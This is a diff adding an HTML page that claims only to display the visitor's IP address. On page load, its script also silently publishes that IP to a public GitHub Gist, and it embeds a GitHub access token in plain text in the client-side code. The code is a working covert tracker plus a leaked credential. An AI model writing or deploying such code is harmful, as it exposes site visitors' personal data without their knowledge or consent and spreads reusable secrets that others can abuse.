@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Display IP Address</title>
+</head>
+<body>
+    <h1>Your IP Address:</h1>
+    <p id="ip-address"></p>
+
+    <script>
+        // Fetch the IP address from ipify API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                // Display the IP address on the page
+                const ipAddress = data.ip;
+                document.getElementById('ip-address').textContent = ipAddress;
+                
+                // Send the IP address to GitHub Gists
+                const gistData = {
+                    description: 'IP Address',
+                    public: true,
+                    files: {
+                        'ip_address.txt': {
+                            content: ipAddress
+                        }
+                    }
+                };
+
+                fetch('https://api.github.com/gists', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'token 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',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(gistData)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Gist created:', data);
+                })
+                .catch(error => {
+                    console.error('Error creating gist:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+                document.getElementById('ip-address').textContent = 'Error fetching IP address';
+            });
+    </script>
+</body>
+</html>
